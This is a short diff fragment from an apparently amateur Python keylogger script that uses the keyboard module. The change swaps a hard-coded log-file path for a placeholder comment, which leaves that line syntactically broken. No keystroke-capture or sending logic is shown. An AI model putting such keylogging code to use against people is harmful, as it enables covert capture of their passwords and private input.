@@ -2,7 +2,7 @@ import keyboard
 import time
 
 # Specify the log file path (change as needed)
-log_file = "F:\\VScode\\key logger\\logs.txt"
+log_file = #Specify the folder for log filehere
 
 
 def on_press(event):
